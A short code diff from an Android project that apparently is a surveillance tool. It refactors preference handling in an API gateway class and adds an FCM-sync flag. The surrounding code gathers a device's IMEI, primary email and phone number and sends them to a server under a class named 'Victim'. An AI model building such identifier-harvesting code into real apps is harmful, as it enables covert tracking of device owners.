@@ -1,6 +1,7 @@
 package com.theah64.xrob.utils;
 
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
@@ -61,7 +62,8 @@ public class APIRequestGateway {
         final String imei = profileUtils.getIMEI();
         final String email = profileUtils.getPrimaryEmail();
         final String phone = profileUtils.getPhone();
-        final String fcmId = PrefUtils.getInstance(context).getString(Victim.KEY_FCM_ID);
+        final PrefUtils prefUtils = PrefUtils.getInstance(context);
+        final String fcmId = prefUtils.getString(Victim.KEY_FCM_ID);
 
         //Attaching them with the request
         final Request inRequest = new APIRequestBuilder("/in")
@@ -92,7 +94,13 @@ public class APIRequestGateway {
                     final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);
 
                     //Saving in preference
-                    PrefUtils.getInstance(context).saveString(KEY_API_KEY, apiKey);
+                    final SharedPreferences.Editor editor = prefUtils.getEditor();
+                    if (fcmId != null) {
+                        editor.putBoolean(PrefUtils.IS_FCM_SYNCED, true);
+                    }
+                    
+                    editor.putString(KEY_API_KEY, apiKey).commit();
+
 
                     if (jobCallback != null) {
                         jobCallback.onJobFinish(apiKey);
